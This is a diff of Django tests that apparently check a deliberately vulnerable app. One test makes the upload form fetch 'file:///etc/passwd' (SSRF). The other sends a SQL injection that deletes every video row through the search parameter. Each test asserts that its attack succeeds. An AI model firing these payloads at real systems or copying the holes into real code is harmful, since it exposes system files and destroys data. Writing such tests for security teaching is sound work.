@@ -1,7 +1,10 @@
-from django.test import TestCase
+from django.test import TestCase, LiveServerTestCase
 from django.contrib.auth.models import User
 
-import urllib.request
+from bs4 import BeautifulSoup
+
+from .models import Video
+
 
 class LoginTestCase(TestCase):
     def setUp(self):
@@ -41,6 +44,44 @@ class LoginTestCase(TestCase):
         self.assertEqual(response.wsgi_request.path, '/login/')
 
 
-class UserUploadDeleteTestCase(TestCase):
-    def test_urllib(self):
-        pass
+class SSRFTestCase(LiveServerTestCase):
+    def test_ssrf(self):
+        # First create a user for the test
+        user = User.objects.create(username='testuser')
+        user.set_password('123456')
+        user.save()
+
+        # Second log them in.
+        self.client.login(username='testuser', password='123456')
+
+        # First upload with the URL /etc/passwd
+        response = self.client.post('/upload', {
+            'name': 'ssrf',
+            'desc': 'This is an ssrf test',
+            'url': 'file:///etc/passwd'
+        }, follow=True)
+
+        soup = BeautifulSoup(response.content, features='html.parser')
+        file = soup.find_all('source')[0]['src']
+        self.assertTrue(file.endswith('passwd'))
+
+
+class ClassicSQLInjection(TestCase):
+    def test_sql_injection(self):
+        # First lets creat a bunch od data
+        user = User.objects.create(username='testuser')
+        user.set_password('123456')
+        user.save()
+        video_one = Video.objects.create(name='Test 1', desc='This is a test', views=0, owner=user)
+        video_two = Video.objects.create(name='Test 2', desc='This is a test', views=0, owner=user)
+        video_three = Video.objects.create(name='Test 3', desc='This is a test', views=0, owner=user)
+
+        self.assertEqual(3, len(Video.objects.all()))
+
+        # Do a regular search
+        self.client.get('/search?q=Test')
+
+        # Now, we need to perform the SQL injection
+        self.client.get('/search?q=%27%3B+delete+from+app_video+--')
+
+        self.assertEqual(0, len(Video.objects.all()))
